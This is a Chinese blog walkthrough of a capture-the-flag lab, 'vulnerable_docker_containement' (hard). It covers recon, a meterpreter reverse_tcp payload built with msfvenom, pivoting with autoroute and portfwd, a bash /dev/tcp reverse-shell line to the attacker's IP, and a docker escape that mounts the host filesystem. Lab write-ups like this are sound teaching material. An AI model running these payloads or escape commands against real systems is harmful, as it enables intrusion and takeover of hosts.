> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk3NTIyOTA0OQ==&mid=2247485103&idx=1&sn=39fb88b11cae5d38e87df61718887117

#  vulnerable_docker_containement（hard难度）MSF内网穿透、docker逃逸、wpscan爆破。  
原创 泷羽Sec-朝阳  泷羽Sec-朝阳   2025-06-15 09:12  
  
## 一、信息收集  
### 1、主机发现  
  
arp-scan -l![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAAynz064rYjXDgYeZe3dB6ER4mre3YibLAIIyF5jBuE1ibbiaFpZG8Yp40g/640?wx_fmt=png&from=appmsg "")  
  
### 2、端口扫描  
  
nmap -sS -sV 192.168.66.146 nmap -p- -Pn -sC -sV -n 192.168.66.146 whatweb -v 192.168.66.146  

```
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 

8000/tcp open  http    Apache httpd 2.4.10 ((Debian))

```

  
ok，这里扫出来两个端口，一个8000端口一个22端口，我们先看看8000端口有什么东西  
### 3、目录扫描，指纹识别  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAAv5fcF0t9hTldkaL6JVk9NW9Rzc9lllY0v96kHLaH8IE9GLOUbOYpZw/640?wx_fmt=png&from=appmsg "")  
这个hard难度我打开的时候就已经有之前的缓存了，那我们直接连接shell即可  
### 4、gitshell，内网信息收集  
  
内网收集![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAAEb9YhBEtib1bu3fwUgSwevL9iaQdibQmk7c8UtpSrxXdnh0aicLiaKM9Biag/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAAPwTAPaibLedLicb8CUkiaa5NoOmFbpaqrYsWA2X9NfZ2duRam9EfFhBGg/640?wx_fmt=png&from=appmsg "")  
ok，这里找到了个ip，应该和上台靶机一样的 老规矩，探测一下内网存活i  

```
for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep &#34;bytes from&#34; | grep -v &#34;Unreachable&#34; &); done;

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAAictnkpkPojlwz7UQiaNicwJoIibiak9Aa8WNh9GWcak4kicMzBYXVCRsibWRQ/640?wx_fmt=png&from=appmsg "")  
### 5、代理搭建  
  
这里直接使用msf模块  

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.66.129 LPORT=9999 -f elf > hzy

```

  
使用MSF创建稳定shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAAYPUUaQh7JcUtHicu3rG6G3VBIX1h5LrATPXSbJy3sOKhor1vclI4w6A/640?wx_fmt=png&from=appmsg "")  
我们下载下来，然后kali上开一个监听  

```
use exploit/multi/handler
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
msf6 exploit(multi/handler) > set lhost 192.168.66.129
msf6 exploit(multi/handler) > set lport 9999
msf6 exploit(multi/handler) > run

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAANJh6PJibibs9rNt6B3Gz4MhO57icVSkj3ib7wJks3Ujiapxicmj5XaTCsdNA/640?wx_fmt=png&from=appmsg "")  
ok，这里拿到了不稳定的shell，接下来我们弹一条shell  
  
添加路由，搭建代理  

```

meterpreter > route

IPv4 network routes
===================

    Subnet      Netmask      Gateway     Metric  Interface
    ------      -------      -------     ------  ---------
    0.0.0.0     0.0.0.0      172.18.0.1  0       eth0
    172.18.0.0  255.255.0.0  0.0.0.0     0       eth0

No IPv6 routes were found.
meterpreter > run post/multi/manage/autoroute

[*] Running module against 172.18.0.2
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
meterpreter > run auturoute -p

[-] The specified meterpreter session script could not be found: auturoute
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.18.0.0         255.255.0.0        Session 1



```

### 6、内网扫描同网段主机  
  
这里我们直接用net.sh脚本扫内网存活主机了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAA6DJTwYiagQWlrSLdOJQgGvbOYtjynvjkzB0icRr4NufzjpicHJwv34iarg/640?wx_fmt=png&from=appmsg "")  
这里端口转发就要msf的了，比较方便![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAARMLJibOFhTMaPyp3mbkYyuwLS89dec7NEictCzW5t3I6WpQy4vceuQdw/640?wx_fmt=png&from=appmsg "")  
怪可爱的，msf的logo  

```
portfwd add -l 8022 -p 8022 -r 172.18.0.4

```

  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAARwVKuTgcRSciaQoRCRhWmbGuKwEHKekWicASOClwbo7ziaaqLvkHUPk7g/640?wx_fmt=png&from=appmsg "")  
转发成功，访问8022端口  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAASdt9UMRs7J9YtJAicgCJQgGDcQazV6woibmFKM8OprMavgCR2aW6xydA/640?wx_fmt=png&from=appmsg "")  
ok，转发成功，这里反弹一个shell，因为这个是docker环境，不能做什么操作 bash -i >& /dev/tcp/192.168.66.129/7777 0>&1 这里出了点问题，就是我的kali端口转发后访问127.0.0.1：8022端口后的页面关闭了之后就再也无法访问了，这里就借鉴其他师傅的wp了。![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAAUzyjmBkVo3gwY9X39kYLNZs3UcrtC7ut4CCXEmW6vGYXtic02GaP1hA/640?wx_fmt=png&from=appmsg "")  
卡在这个页面再也不动了，有知道的师傅可以评论  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAACyXCWYkTb1KbMtrd6ia2kqLpsvfg3VwK5TCgI7F8Yz5I3ac9URo7ialg/640?wx_fmt=png&from=appmsg "")  

```
apt update
apt install python docker wget
如果docker无法安装成功，可以通过在其他主机上复制docker二进制文件，并下载到容器中

```

### 7.使用Python创建虚拟终端  
  
python -c 'import pty; pty.spawn("/bin/bash")' ./docker run -it -v /:/host ubuntu bash cd /host  
### 8.获取flag  
  
![](https://mmbiz.qpic.cn/mmbiz_png/HgEiaULLGWT21lagBTgP7v1cCUENXHYAA6RgIztzts96y8nibYJz9DslErfDsBlSa1UUspw3RIJNlRZCnNKfMpVQ/640?wx_fmt=png&from=appmsg "")  
  
这个好像和easy难度没什么区别，如果前面步骤有不懂的可以参考easy难度，哪个写的更完整  
  
  
